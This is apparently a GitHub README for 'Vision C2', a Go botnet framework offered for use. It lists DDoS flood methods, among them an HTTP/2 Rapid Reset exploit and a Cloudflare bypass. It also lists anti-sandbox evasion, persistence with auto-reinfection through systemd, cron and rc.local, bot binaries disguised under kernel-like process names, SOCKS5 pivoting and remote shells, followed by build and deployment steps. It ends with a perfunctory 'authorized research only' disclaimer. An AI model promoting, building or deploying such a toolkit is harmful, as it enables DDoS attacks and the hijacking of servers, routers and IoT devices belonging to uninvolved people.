
<div align="center">

# ☾℣☽ision C2 - Multi-arch Linux botnet framework written in GO

> **With TLS 1.3 transport communications + 6-Layer C2 Address Obfuscation + AES-128-CTR string encryption — 14-arch cross-compiled agents, L4/L7 floods, interactive remote shells, SOCKS5 proxying, and full persistence — driven through a real-time Go TUI**

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)

[![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
[![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)
<img width="907" height="840" alt="image" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## Key Features

| | Feature | Description |
|---|---|---|
| 🤖 | **CNC** | Full-featured TUI control panel built with BubbleTea |
| 🔒 | **Communication** | Modern TLS 1.3 encrypted bot-to-server communication on port 443 (Indistinguishable from HTTPS traffic)|
| ⚔️ | **Attack Methods** | Layer 4 (network) and Layer 7 (application) |
| 🕵️ | **Evasion** | 6-layer C2 encryption (AES-128-CTR + 5-layer obfuscation), AES-128-CTR encrypted strings (zero sensitive plaintext in binary), 16-byte split XOR key, VM/sandbox/debugger detection (40+ signatures), 24-27h delayed exit on detection |
| 👻 | **Stealth** | Unix daemonization, single-instance enforcement, disguised process names, PID lock |
| ♻️ | **Persistence** | Systemd service + cron + rc.local, hidden directory with download script, auto-reinfection on reboot, cleanup tool included (`tools/cleanup.sh`) |
| 🧦 | **SOCKS5 Proxy** | Full SOCKS5 pivoting through bots, RFC 1929 username/password auth, runtime credential updates |
| 📡 | **C2 Resilience** | TXT/A records + direct IP, runtime C2 decryption |
| 💻 | **Cross-Platform** | 14 multi-arch targets + custom UPX packer |
| ⚡ | **Auto-Setup** | Python script automates config + build |

---

## Attack Methods

<img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />

<details>
<summary><b>Layer 4 — Network/Transport</b></summary>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | SYN packets with randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol (47) packets with max payload |
| **DNS Flood** | Randomized DNS query types (A, AAAA, MX, NS, etc.) |

</details>

<details>
<summary><b>Layer 7 — Application</b></summary>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487) with batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

<img width="1179" height="586" alt="image" src="https://github.com/user-attachments/assets/06f7ca4c-3119-4cd3-81dd-2224d131c290" />

## Installation

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update && sudo apt install -y \
    upx-ucl openssl git wget gcc python3 screen build-essential

# Install Go (1.24+ required)
wget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version  # verify installation
```

### Quick Setup

1. **Clone the repository**

   ```bash
   git clone https://github.com/Syn2Much/VisionC2.git
   cd VisionC2
   chmod +x setup.py tools/*.sh
   ```

2. **Run interactive setup**

   ```bash
   python3 setup.py
   ```

   The setup script will:
   - Generate 4096-bit TLS certificates
   - Create encryption keys and configuration
   - Cross-compile binaries for all supported architectures
   - Build the C2 server binary

3. **Output locations**

   | Output | Path |
   |---|---|
   | C2 Server | `./server` |
   | Agent Binaries | `./bins/` |
   | Configuration | `setup_config.txt` |
   

### Bot Binaries

| Binary | Architecture | Use Case |
|--------|--------------|----------|
| ethd0 | x86_64 (amd64) | Servers, desktops |
| kworkerd0 | x86 (386) | 32-bit systems |
| ip6addrd | ARM64 | Raspberry Pi 4, phones |
| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
| deferwqd | MIPS | Routers |
| devfreqd0 | MIPSLE | Routers (little-endian) |
| *...and 8 more* | Various | IoT, embedded |

---

## Usage

### Starting the C2 Server

**Option 1: TUI Mode (Recommended)**

```bash
screen ./server
```

- Detach: `Ctrl + A` → `D`
- Reattach: `screen -r`

**Option 2: Telnet/Multi-User Mode**

```bash
screen ./server --split
nc your-server-ip 1337
```

- User database: `cnc/users.json`
- Login keyword: configured during setup

---

## Architecture

### Two Main Components

- **`cnc/`** — Command & Control server. Dual-listener architecture: TLS on port 443 for bot connections, Interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) defined in `users.json`.

- **`bot/`** — Agent deployed to targets. Connects back to CNC over TLS 1.3. Lifecycle: decrypt config → daemonize → singleton lock → sandbox detection → install persistence → DNS-resolve C2 → connect with reconnect loop.

### Key Source Files

| File | Purpose |
|------|---------|
| `bot/config.go` | All configuration: AES-encrypted C2 address (`encGothTits`), crypto seed, magic code, protocol version, encrypted string blobs |
| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH → UDP → A record → raw) |
| `bot/attacks.go` | All L4/L7 DDoS methods |
| `bot/opsec.go` | AES encryption, key derivation, sandbox/VM/debugger detection |
| `bot/persist.go` | Persistence via systemd, cron, rc.local |
| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
| `cnc/ui.go` | Bubble Tea TUI — all views, keybindings, rendering |
| `cnc/cmd.go` | Command dispatch and routing to bots |
| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
| `cnc/miscellaneous.go` | RBAC, user authentication, utilities |

### Shared Configuration (must match between bot and CNC)

Three values in `bot/config.go` and `cnc/main.go` **must be identical** for communication to work:

- `magicCode` / `MAGIC_CODE` — 16-char auth token
- `protocolVersion` / `PROTOCOL_VERSION` — version string
- `cryptSeed` — 8-char hex seed (bot-side only, used for C2 address decoding)

---

## Encryption Architecture

- **C2 address**: 6-layer encoding pipeline — AES-128-CTR outer layer wrapping 5 inner layers (MD5 checksum → byte substitution → RC4 → XOR rotating key → base64). The AES-encrypted blob is decrypted at runtime then decoded in a 5 step decryption process)
- **Sensitive strings**: AES-128-CTR with key derived from 16 split XOR functions. Encrypted at build time via `tools/crypto.go`, decrypted at runtime by `initSensitiveStrings()` 
- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`)

## Documentation

| Document | Description |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`USAGE.md`](Docs/USAGE.md) | Usage guide |

---

## Legal Disclaimer

> **FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**
>
> **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**

---
## 🔧 Troubleshooting


```

### Bots Not Connecting

1. Check firewall: `sudo ufw allow 443/tcp`
2. run tool/fix_botkill.sh
3. Verify C2 in `setup_config.txt`
4. Test TLS: `openssl s_client -connect YOUR_SERVER:443`


### Build Errors

```bash
# Go not found
export PATH=$PATH:/usr/local/go/bin

# UPX not found
sudo apt install upx-ucl
```

## Author

**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) · [@synacket](https://x.com/synacket)

---

<div align="center">
<sub>Maintained with ❤️ by Syn</sub>
</div>
